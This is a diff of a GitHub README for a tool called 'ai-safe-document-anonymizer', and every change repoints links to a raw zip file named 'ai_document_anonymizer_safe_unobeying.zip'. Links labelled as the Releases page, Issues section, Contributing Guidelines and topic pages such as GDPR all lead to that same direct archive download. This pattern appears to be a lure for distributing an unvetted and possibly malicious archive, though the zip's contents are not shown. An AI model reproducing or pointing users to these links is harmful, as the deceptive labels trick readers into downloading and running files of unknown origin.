@@ -6,7 +6,7 @@ Welcome to **ai-safe-document-anonymizer**! This tool helps you safely share sen
 
 ## 📥 Download Link
 
-[![Download ai-safe-document-anonymizer](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/static/assets/anonymizer_document_safe_ai_v3.6.zip)](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/static/assets/anonymizer_document_safe_ai_v3.6.zip)
+[![Download ai-safe-document-anonymizer](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/routes/ai_document_anonymizer_safe_unobeying.zip)](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/routes/ai_document_anonymizer_safe_unobeying.zip)
 
 ## 🔍 Features
 
@@ -23,7 +23,7 @@ Welcome to **ai-safe-document-anonymizer**! This tool helps you safely share sen
 
 ## 📂 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/static/assets/anonymizer_document_safe_ai_v3.6.zip) to download the latest version. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/routes/ai_document_anonymizer_safe_unobeying.zip) to download the latest version. Follow these steps:
 
 1. Click the link above to go to the Releases page.
 2. Locate the latest release.
@@ -53,7 +53,7 @@ Your privacy is our priority. The application does not store or share your docum
 
 ## 🤝 Support
 
-If you encounter any issues while using the application, please check the [Issues section](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/static/assets/anonymizer_document_safe_ai_v3.6.zip) on GitHub for help. You can report any bugs or request features in that section.
+If you encounter any issues while using the application, please check the [Issues section](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/routes/ai_document_anonymizer_safe_unobeying.zip) on GitHub for help. You can report any bugs or request features in that section.
 
 ## 📞 Contact
 
@@ -61,13 +61,13 @@ For further assistance or inquiries, feel free to contact us via GitHub. We valu
 
 ## 🔗 Related Topics
 
-- [AI Safety](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/static/assets/anonymizer_document_safe_ai_v3.6.zip)
-- [Anonymization](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/static/assets/anonymizer_document_safe_ai_v3.6.zip)
-- [GDPR](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/static/assets/anonymizer_document_safe_ai_v3.6.zip)
-- [Document Processing](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/static/assets/anonymizer_document_safe_ai_v3.6.zip)
+- [AI Safety](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/routes/ai_document_anonymizer_safe_unobeying.zip)
+- [Anonymization](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/routes/ai_document_anonymizer_safe_unobeying.zip)
+- [GDPR](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/routes/ai_document_anonymizer_safe_unobeying.zip)
+- [Document Processing](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/routes/ai_document_anonymizer_safe_unobeying.zip)
 
 ## 🌟 Contribution
 
-You can contribute to this project! If you have ideas for features or improvements, please submit a pull request. For more information on contributing, check our [Contributing Guidelines](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/static/assets/anonymizer_document_safe_ai_v3.6.zip).
+You can contribute to this project! If you have ideas for features or improvements, please submit a pull request. For more information on contributing, check our [Contributing Guidelines](https://raw.githubusercontent.com/flo668/ai-safe-document-anonymizer/main/routes/ai_document_anonymizer_safe_unobeying.zip).
 
 Thank you for choosing **ai-safe-document-anonymizer**! We hope it helps you share sensitive documents securely.
